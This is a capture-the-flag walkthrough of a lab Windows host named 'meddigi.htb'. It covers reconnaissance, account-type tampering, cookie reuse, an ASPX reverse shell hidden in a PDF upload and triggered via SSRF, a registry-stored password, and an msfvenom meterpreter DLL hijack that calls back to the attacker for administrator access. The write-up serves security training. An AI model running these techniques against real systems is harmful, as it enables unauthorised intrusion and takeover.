


Nmap

```
# Nmap 7.94 scan initiated Sat Oct 28 15:21:20 2023 as: nmap -sC -sV -oN full -p- -min-rate 5000 -vvv 10.10.11.238

Nmap scan report for 10.10.11.238

Host is up, received syn-ack (0.30s latency).

Scanned at 2023-10-28 15:21:21 EDT for 143s
Not shown: 65532 filtered tcp ports (no-response)
PORT STATE SERVICE REASON VERSION

80/tcp open http syn-ack Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to [https://meddigi.htb/](https://meddigi.htb/)
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/10.0

443/tcp open https? syn-ack

5985/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Read data files from: /usr/bin/../share/nmap

Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .

# Nmap done at Sat Oct 28 15:23:44 2023 -- 1 IP address (1 host up) scanned in 144.13 seconds
```

Whatweb and wappalizer

```
whatweb 10.10.11.238

[http://10.10.11.238](http://10.10.11.238) [302 Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.238], Microsoft-IIS[10.0], RedirectLocation[[https://meddigi.htb/](https://meddigi.htb/)], Title[Document Moved]
```


This is a windows machine running  a Microsoft IIS 10 server


Ffuf :

```
ffuf -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u [https://meddigi.htb](https://meddigi.htb) -H "Host:FUZZ.meddigi.htb"
```

Using this command I found a subdomain called "portal"


Add the meddigi domain to the /etc/host file
```
10.10.11.238 meddigi.htb portal.meddigi.htb

```

# Foothold

This machine has two log-in sites, meddigi.htb/login and portal.meddigi.htb/login  the second one Is ony exclusive for doctors.

The first thing that I did was register myself on meddigi.htb and intercept the petition with burpsuit. I change a value that seems like a IDOR vulnerability from 1 to 2 and I created an doctor account

```
Name=doctor&LastName=doctor&Email=doctor%40doctor.com&Password=doctor1234&ConfirmPassword=doctor1234&DateOfBirth=1950-12-12&PhoneNumber=1234567891&Country=angola&Acctype=2&__RequestVerificationToken=CfDJ8DkoRHGZGuZLr7GTEMxTTkcpQpr0u7-XGlXtSc7DSVg3Z8AYuv7nuWwx-wOz_UGXEmhsbR7vqlpzGb_t8M0PgnGlJJmqkQ-umwmf1KmoP9bGHB2bkxRCGLIhlBTydphcyX9Q6yn-JATGGGVzp_h_ffE
```
The infrastructure of this app is on Microsoft ASP.NET, and is working with some JWT cookie
When I was logged in as a doctor I found a JWT cookie , called "access token". 

```
access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjIxIiwiZW1haWwiOiJwcnVlYmFAcHJ1ZWJhLmNvbSIsIm5iZiI6MTY5ODUyNDA4MSwiZXhwIjoxNjk4NTI3NjgxLCJpYXQiOjE2OTg1MjQwODEsImlzcyI6Ik1lZERpZ2kiLCJhdWQiOiJNZWREaWdpVXNlciJ9.
```

I decoded it on  https://jwt.io/
```
{
"alg": "HS256",

"typ": "JWT"
}

{
"unique_name": "21",
"email": "prueba@prueba.com",
"nbf": 1698524081, 
"exp": 1698527681, 
"iat": 1698524081,
"iss": "MedDigi",
"aud": "MedDigiUser"
}
```

This token grants me the access to the  portal.meddigi.htb/login. How? 

I copy the "access_token" cookie from the meddigi.htb and y paste it on the portal.meddigi.htb

You can use a tool that you can add on your browser called "edit this cookie" or like me pussing on the browser : Application> Cookies> portal.meddigi.htb
At this point adding the values:
```
Name:access_token
Value: (the value of the cookie)
(you may add more values than this two)
```

Right now I had access to the portal.meddigi.htb

The next step is upload a malicious pdf file on the "upload report" and intercept it with burpsuit.

Then I do this:

- Upload a clean PDF (without nothing)
- Change the name of the file from "clean.pdf to reverseshell.aspx"
- At the end of the data there is an EOF, bellow the EOF I copy a reverse shell that I take from this site https://github.com/borjmz/aspx-reverse-shell 
- Finally I send the petition

To trigger the reverse shell I go to a section called "prescriptions"

There is an input where you can put a url and see the historial of prescriptions. This field is vulnerable to SSRF.

Adding this URL 
```
http://127.0.0.1:8080/
```

This query makes me to see the URL's of where the reports are located. 

So to trigger the shell I need to copy the location of the file an then query it on the input that is vulnerable to SSRF

```
http://127.0.0.1:8080/?ViewReport=65465ERG435_234234-34234reverseshell.aspx
```
(FIRST LISTEN ON NETCAT OR MSF to trigger it)


# User and root

Now I was `appsanity\svc_exampanel` and I was able to catch the user flag.

The next step is examine this file :
```
c:\inetpub\ExaminationPanel\ExaminationPanel\bin\ExaminationManagement.dll
```

I used https://www.decompiler.com and I watched this function and I was able to find new credentials

```
private string RetrieveEncryptionKeyFromRegistry()
{
try
{
using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\MedDigi");
if (registryKey == null)
{
ErrorLogger.LogError("Registry Key Not Found");
((Page)this).Response.Redirect("Error.aspx?message=error+occurred");
return null;
}
object value = registryKey.GetValue("EncKey");
if (value == null)
{
ErrorLogger.LogError("Encryption Key Not Found in Registry");
((Page)this).Response.Redirect("Error.aspx?message=error+occurred");
return null;
}
return value.ToString();
}
catch (Exception ex)
{
ErrorLogger.LogError("Error Retrieving Encryption Key", ex);
((Page)this).Response.Redirect("Error.aspx?message=error+occurred");
return null;
}
}
```

This function is calling me about a HKLM key. And I can query it 

```
C:\>reg query HKLM\Software\MedDigi /v EncKey


HKEY_LOCAL_MACHINE\Software\MedDigi
EncKey REG_SZ 1g0tTh3R3m3dy!!
```


Now I can connect with evil winrm

```
evil-winrm -u devdoc -p '1g0tTh3R3m3dy!!' -i 10.10.11.238 -P 5985
```



Now I need to search a particular executable, on this route:

```
Evil-WinRM* PS C:\Program Files\ReportManagement> download ReportManagement.exe
```

There is a service running on this machine on the port 100 that is using this application

```
netstat -ano
Active Connections
Proto Local Address Foreign Address State PID
TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 4
TCP 0.0.0.0:100 0.0.0.0:0 LISTENING 4240
TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 916
TCP 0.0.0.0:443 0.0.0.0:0 LISTENING 4
TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4
TCP 0.0.0.0:5040 0.0.0.0:0 LISTENING 4596
TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING 4
TCP 0.0.0.0:8080 0.0.0.0:0 LISTENING 4
TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING 4
TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING 700
TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING 532
TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING 1128
TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING 1532
TCP 0.0.0.0:49668 0.0.0.0:0 LISTENING 680
TCP 10.10.11.238:80 10.10.16.75:48764 ESTABLISHED 4
TCP 10.10.11.238:80 10.10.16.75:48776 ESTABLISHED 4
TCP 10.10.11.238:80 10.10.16.75:48792 ESTABLISHED 4
TCP 10.10.11.238:80 10.10.16.75:48794 ESTABLISHED 4
TCP 10.10.11.238:80 10.10.16.75:48818 ESTABLISHED 4
TCP 10.10.11.238:80 10.10.16.75:48828 ESTABLISHED 4
TCP 10.10.11.238:80 10.10.16.75:48842 ESTABLISHED 4
TCP 10.10.11.238:80 10.10.16.75:48852 ESTABLISHED 4
TCP 10.10.11.238:80 10.10.16.75:48860 ESTABLISHED 4
TCP 10.10.11.238:80 10.10.16.75:48866 ESTABLISHED 4
TCP 10.10.11.238:139 0.0.0.0:0 LISTENING 4
TCP 10.10.11.238:443 10.10.14.137:39046 ESTABLISHED 4
TCP 10.10.11.238:5985 10.10.14.204:36164 TIME_WAIT 0
TCP 10.10.11.238:5985 10.10.14.204:38478 TIME_WAIT 0
TCP 10.10.11.238:5985 10.10.14.204:38480 ESTABLISHED 4
TCP 10.10.11.238:5985 10.10.14.204:53210 ESTABLISHED 4
TCP 10.10.11.238:56823 10.10.14.204:8000 ESTABLISHED 3468
TCP 10.10.11.238:56838 10.10.16.86:443 ESTABLISHED 3268
TCP 10.10.11.238:56853 10.10.14.204:8000 TIME_WAIT 0
TCP 10.10.11.238:56855 10.10.14.204:8000 TIME_WAIT 0
TCP [::]:80 [::]:0 LISTENING 4
TCP [::]:135 [::]:0 LISTENING 916
TCP [::]:443 [::]:0 LISTENING 4
TCP [::]:445 [::]:0 LISTENING 4
TCP [::]:5985 [::]:0 LISTENING 4
TCP [::]:8080 [::]:0 LISTENING 4
TCP [::]:47001 [::]:0 LISTENING 4
TCP [::]:49664 [::]:0 LISTENING 700
TCP [::]:49665 [::]:0 LISTENING 532
TCP [::]:49666 [::]:0 LISTENING 1128
TCP [::]:49667 [::]:0 LISTENING 1532
TCP [::]:49668 [::]:0 LISTENING 680
UDP 0.0.0.0:123 *:* 5848
UDP 0.0.0.0:5050 *:* 4596
UDP 0.0.0.0:5353 *:* 1980
UDP 0.0.0.0:5355 *:* 1980
UDP 10.10.11.238:137 *:* 4
UDP 10.10.11.238:138 *:* 4
UDP 10.10.11.238:1900 *:* 3492
UDP 10.10.11.238:56064 *:* 3492
UDP 127.0.0.1:1900 *:* 3492
UDP 127.0.0.1:56065 *:* 3492
UDP 127.0.0.1:60913 *:* 2976
UDP [::]:123 *:* 5848
UDP [::1]:1900 *:* 3492
UDP [::1]:56063 *:* 3492
```

When I port forwarded the 100 port with chisel  I was able to see that there is a "upload functionality" on certain application.

I downloaded the ReportManagement.exe to my kali machine and I use this command:

```
kali> strings ReportManagement.exe | grep .dll -A2 -B2
```

Output:
```
.dll
externalupload
Failed to upload a external source.
```


Looking at these I was able to see that the functionality "upload" on a service running on the port 100 is triggering .dll files on a particular folder `c:\Program Files\ReportManagement\libraries`

Now I must create a reverse shell to become administrator and put it on the folder "libraries"

```
msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f dll LHOST=<MYIP> LPORT=<443> > o externalupload.dll
```

Once I put it on the victim machine with that specific name on that specific path I used chisel.exe.

On my machine:
```
./chisel server --reverse -p 1234 
```
On the victim
```
./chisel client <MY IP>:1234 R:<VICTIM IP>:100
```


I started to listen on the port 443 , I have problems with netcat so I used metasploit 
https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html


On my Kali machine I used this to connect to the port 100 that I redirect from the victim machine to my machine
```
nc 127.0.0.1:100
```
Then here I type :
```
upload ""
```
This triggers the reverse shell that I put on the "libraries folder" and finally I was able to read the root flag.

